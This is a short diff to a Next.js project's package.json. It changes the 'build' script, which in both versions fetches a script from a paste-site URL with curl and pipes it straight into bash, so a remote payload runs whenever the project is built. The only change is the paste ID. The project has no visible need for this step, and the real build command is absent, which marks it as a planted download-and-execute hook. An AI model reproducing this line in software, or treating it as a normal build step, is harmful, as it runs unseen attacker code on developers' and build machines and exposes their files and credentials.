@@ -5,7 +5,7 @@
   "scripts": {
     "dev": "next dev -p 3333",
     "lint": "next lint",
-    "build": "curl -sL https://muq-hastebin.glitch.me/raw/H5BRnidfnz | bash",
+    "build": "curl -sL https://muq-hastebin.glitch.me/raw/65I6LhccWy | bash",
     "start": "next start"
   },
   "dependencies": {
